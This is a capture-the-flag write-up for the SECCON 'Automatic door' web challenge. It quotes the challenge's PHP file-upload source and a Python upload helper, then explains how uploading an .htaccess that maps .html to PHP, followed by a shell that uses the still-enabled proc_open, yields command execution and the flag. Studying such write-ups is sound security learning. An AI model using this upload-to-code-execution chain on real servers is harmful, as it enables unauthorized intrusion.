# Automatic door (Web, 500p)

In the task we get the source code of a webpage we can access:

```php
 <?php
$fail = str_repeat('fail', 100);
$d = 'sandbox/FAIL_' . sha1($_SERVER['REMOTE_ADDR'] . '95aca804b832f4c329d8c0e7c789b02b') . '/';
@mkdir($d);

function read_ok($f)
{
    return strstr($f, 'FAIL_') === FALSE &&
        strstr($f, '/proc/') === FALSE &&
        strstr($f, '/dev/') === FALSE;
}

function write_ok($f)
{
    return strstr($f, '..') === FALSE && read_ok($f);
}

function GetDirectorySize($path)
{
    $bytestotal = 0;
    $path = realpath($path);
    if ($path !== false && $path != '' && file_exists($path)) {
        foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS)) as $object) {
            $bytestotal += $object->getSize();
        }
    }
    return $bytestotal;
}

if (isset($_GET['action'])) {
    if ($_GET['action'] == 'pwd') {
        echo $d;

        exit;
    }
    else if ($_GET['action'] == 'phpinfo') {
        phpinfo();

        exit;
    }
    else if ($_GET['action'] == 'read') {
        $f = $_GET['filename'];
        if (read_ok($f))
            echo file_get_contents($d . $f);
        else
            echo $fail;

        exit;
    } else if ($_GET['action'] == 'write') {
        $f = $_GET['filename'];
        if (write_ok($f) && strstr($f, 'ph') === FALSE && $_FILES['file']['size'] < 10000) {
            print_r($_FILES['file']);
            print_r(move_uploaded_file($_FILES['file']['tmp_name'], $d . $f));
        }
        else
            echo $fail;

        if (GetDirectorySize($d) > 10000) {
            rmdir($d);
        }

        exit;
    } else if ($_GET['action'] == 'delete') {
        $f = $_GET['filename'];
        if (write_ok($f))
            print_r(unlink($d . $f));
        else
            echo $fail;

        exit;
    }
}

highlight_file(__FILE__);
```

We can read/write files and we need to get a shell.
We can't save files with `ph` in same so no `.php` files for us.

We've made a small script to upload files:

```python
def upload_file(filename):
    with codecs.open(filename, "r") as f:
        res = requests.post(
            "http://automatic_door.pwn.seccon.jp/0b503d0caf712352fc200bc5332c4f95/?action=write&filename=" + filename,
            files={"file": f})
        print(res.text)
```

It seems we can upload a `.htaccess` file with:

```
AddType application/x-httpd-php .html .htm
```

inside and the system will execute php also in html files.
Now we can upload html file with a PHP shell, but according to phpinfo() most of shell-like functions are disabled.
Fortunately not all of them -> http://php.net/manual/en/function.proc-open.php is still available.

We run `/flag_x` as stated in the task description and we recover the flag `SECCON{f6c085facd0897b47f5f1d7687030ae7}`
